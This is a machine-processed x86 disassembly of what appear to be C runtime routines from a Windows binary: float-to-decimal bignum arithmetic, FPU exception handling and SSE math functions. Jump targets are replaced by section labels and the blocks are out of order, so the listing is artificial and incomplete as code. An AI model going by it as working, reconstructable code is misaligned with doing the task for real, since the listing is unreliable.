cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x754 ] ecx
test eax eax
jne r-xdata
inc [ ebp - 0x76c ]
lea esi [ edi + 0x1 ]
mov eax [ ebp - 0x3a4 ]
mov [ edi ] 0x31
mov [ ebp - 0x74c ] esi
test eax eax
je r-xdata
mov eax [ ebp + edi * 4 - 0x1d0 ]
push 0xa
pop edx
mul edx
add eax esi
mov [ ebp + edi * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
mov esi edx
cmp edi ecx
jne r-xdata
mov [ ebp - 0x764 ] esi
test esi esi
mov esi [ ebp - 0x74c ]
je r-xdata
mov ecx [ ebp - 0x1d4 ]
test ecx ecx
je r-xdata
cmp ecx [ ebp - 0x1d4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x1d0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
test edi edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
push eax
lea eax [ ebp - 0x960 ]
jmp r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
cmp ecx [ ebp - 0x3a4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x3a0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] ecx
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x744 ] eax
mov [ ebp - 0x3a4 ] eax
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x570 ]
inc edi
sub edi esi
mov ebx edi
shr ebx 0x5
mov esi ebx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40be70
xor eax eax
and edi 0x1f
inc eax
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ ebx + 0x1 ]
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ ebp - 0x574 ] eax
mov ebx 0x1cc
mov [ ebp - 0x3a4 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x1c
cmp esi ebx
jae r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ ecx ]
jmp r-xdata
test esi esi
je r-xdata
mov esi edx
lea eax [ ebp - 0x1d0 ]
mov edx [ ebp - 0x750 ]
sub esi edx
lea eax [ eax + esi * 4 ]
mov [ ebp - 0x74c ] eax
add al 0x30
lea esi [ edi + 0x1 ]
mov [ edi ] al
mov [ ebp - 0x74c ] esi
mov eax [ ebp - 0x76c ]
dec eax
jmp r-xdata
mov eax [ ebp - 0x76c ]
xor edi edi
mov esi eax
xor ecx ecx
mov edi esi
mov ecx [ ebp - 0x1d4 ]
cmp ecx 0x73
jae r-xdata
xor edi edi
xor esi esi
lea edx [ ebp - 0x1d0 ]
jmp r-xdata
lea edi [ ebp - 0x1d0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
xor esi esi
xor ecx ecx
push ebx
push eax
call sub_416ee3
add esp 0x10
lea edx [ ebp - 0x3a0 ]
jmp r-xdata
lea edi [ ebp - 0x3a0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x740 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
add eax eax
shr edx 0x1f
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
and [ ebp - 0x56c ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x570 ] esi
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push 0x4
jmp r-xdata
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx esi
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x754 ]
mov esi [ ebp - 0x750 ]
cmp esi ebx
jae r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x778 ]
test eax eax
js r-xdata
mov eax [ ebp + ecx * 4 - 0x3a0 ]
mul edx
push 0xa
add eax edi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov edi edx
pop edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
mov eax edx
mov [ ebp + ecx * 4 - 0x1d0 ] eax
inc [ ebp - 0x1d4 ]
jmp r-xdata
mul [ ebp + esi * 4 - 0x1d0 ]
add eax edi
mov [ ebp + esi * 4 - 0x1d0 ] eax
mov eax [ ebp - 0x764 ]
adc edx 0x0
inc esi
mov edi edx
cmp esi ecx
jne r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x770 ] edx
test al al
jne r-xdata
mov [ ebp - 0x750 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x1d4 ]
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x1d4 ] 0x0
push 0x0
jmp r-xdata
mov eax [ ebp - 0x754 ]
sub eax [ ebp - 0x74c ]
mov [ ebp - 0x754 ] eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
mov eax edi
mul [ ebp + ecx * 4 - 0x3a0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx [ ebp - 0x764 ]
jne r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x750 ] edx
test al al
jne r-xdata
mov [ ebp - 0x754 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x3a4 ]
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x3a4 ] 0x0
push 0x0
mov eax [ ebp - 0x770 ]
sub eax [ ebp - 0x75c ]
mov [ ebp - 0x770 ] eax
jne r-xdata
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
cmp esi ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and edi [ ebp - 0x758 ]
and eax [ ebp - 0x774 ]
mov ecx [ ebp - 0x750 ]
shl edi cl
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
or edi eax
mov eax [ ebp - 0x754 ]
sub ecx 0x4
mov [ ebp - 0x75c ] ecx
mov [ ebp + eax * 4 - 0x1d0 ] edi
dec eax
dec esi
mov [ ebp - 0x754 ] eax
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
add eax [ ebp - 0x77c ]
mov [ ebp - 0x778 ] eax
cmp esi eax
je r-xdata
mov eax ecx
add ecx eax
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x1d4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
mov ecx [ ebp - 0x758 ]
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
mov ecx [ ebp - 0x764 ]
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
jmp r-xdata
cmp eax edx
jb r-xdata
and [ ebp - 0x56c ] 0x0
xor ecx ecx
push 0x4
pop eax
inc ecx
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x574 ] ecx
mov [ ebp - 0x3a4 ] ecx
push eax
xor eax eax
mov eax [ ebp - 0x74c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
test eax eax
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] edi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x1d4 ] edx
shl eax 0x2
push eax
lea eax [ ebp - 0x740 ]
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] esi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x3a4 ] edx
shl eax 0x2
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x774 ]
and edi [ ebp - 0x758 ]
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
shl edi cl
mov ecx [ ebp - 0x760 ]
or eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
dec ecx
mov eax [ ebp - 0x74c ]
dec esi
sub eax 0x4
mov [ ebp - 0x760 ] ecx
mov [ ebp - 0x74c ] eax
cmp ecx 0xffffffff
je r-xdata
xor edi edi
mov esi eax
xor ecx ecx
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x75c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] ecx
inc [ ebp - 0x1d4 ]
jmp r-xdata
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x74c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jb r-xdata
cmp ecx edx
jb r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mov edx 0x3b9aca00
mul edx
add eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_418eb0
pop ecx
pop ecx
mov ecx [ ebp - 0x778 ]
push 0x8
pop edi
sub ecx esi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x750 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x764 ] eax
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x960 ]
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x754 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x758 ] eax
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
xor al al
jmp r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov [ edi + esi ] dl
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_416ee3
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x770 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x764 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x75c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x75c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x75c ]
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x750 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x758 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x74c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x74c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x74c ]
xor edx edx
div [ ebp - 0x774 ]
add dl 0x30
cmp ecx edi
jb r-xdata
cmp ecx 0x9
jbe r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
add esi ecx
mov [ ebp - 0x74c ] esi
cmp esi [ ebp - 0x778 ]
jne r-xdata
push 0x9
pop ecx
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
sub_41a700
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_41a767
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fxch st1
mov cl [ ebp - 0x9f ]
fxam
fwait
fnstsw [ ebp - 0xa0 ]
fxch st1
mov ch [ ebp - 0x9f ]
shl ch 0x1
sar ch 0x1
rol ch 0x1
mov al ch
and al 0xf
xlat
mov ah al
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
shl ah 0x1
shl ah 0x1
or al ah
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_41a874
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_41a8f4
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
push edi
movzx ecx [ eax ]
mov [ ebp - 0x84 ] ecx
mov eax [ esi ]
sub eax 0x1
je r-xdata
push 0x8
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
sub eax 0x1
je r-xdata
push [ esi ]
call sub_41c153
pop ecx
call sub_41107d
test al al
je r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
or eax 0x3
fstp [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_41bc5f
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
sub eax 0x1
je r-xdata
push esi
call sub_4110aa
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
sub eax 0x3
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_41be3f
add esp 0x18
push 0xffff
push ecx
call sub_41b6d8
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_41aa2e
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_415e0f
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
sub esp 0x10
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movlpd [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_41ac05
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_41ac95
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_41ad50
pop edx
retn
call sub_41ad67
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_41ad50
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_41a8f4
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_41ad67
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_41a8f4
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_41adce
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_415f3f
sub esp 0x10
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
mulsd xmm0 [ r--data ]
